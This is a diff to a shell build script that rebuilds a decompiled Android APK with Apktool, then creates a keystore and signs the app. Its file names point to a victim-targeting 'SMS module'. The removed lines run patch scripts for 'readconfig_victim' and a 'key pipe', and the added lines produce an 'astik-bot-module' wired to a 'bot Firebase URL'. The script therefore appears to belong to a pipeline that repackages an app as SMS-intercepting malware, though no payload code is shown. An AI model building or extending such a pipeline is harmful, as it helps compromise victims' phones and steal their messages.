@@ -20,11 +20,8 @@ if [ ! -f "$APKTOOL" ]; then
     "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
 fi
 
-echo "Building Virtus SMS Module APK (Astik-exact base)..."
-python3 "$ROOT/build_astik_base.py"
-python3 "$ROOT/patch_readconfig_victim.py"
-python3 "$ROOT/patch_key_pipe.py"
-python3 "$ROOT/generate_icons.py"
+echo "Building Astik-base APK (bot Firebase URL only)..."
+python3 "$ROOT/build_astik_minimal.py"
 java -jar "$APKTOOL" b virtus_decompiled -o virtus-unsigned.apk
 
 if [ ! -f "$SIGNER" ]; then
@@ -35,7 +32,7 @@ fi
 
 KEYSTORE="$ROOT/virtus.keystore"
 if [ ! -f "$KEYSTORE" ]; then
-  echo "Creating virtus.keystore (first-time sign key)..."
+  echo "Creating virtus.keystore..."
   keytool -genkeypair -v \
     -keystore "$KEYSTORE" \
     -alias virtus \
@@ -54,4 +51,5 @@ java -jar "$SIGNER" \
   --overwrite
 
 cp virtus-unsigned.apk virtus-sms-module.apk
-echo "Done: $ROOT/virtus-sms-module.apk (Astik-exact, v2/v3 signed)"
+cp virtus-unsigned.apk astik-bot-module.apk
+echo "Done: astik-bot-module.apk (com.astik.module — Astik exact + bot Firebase)"
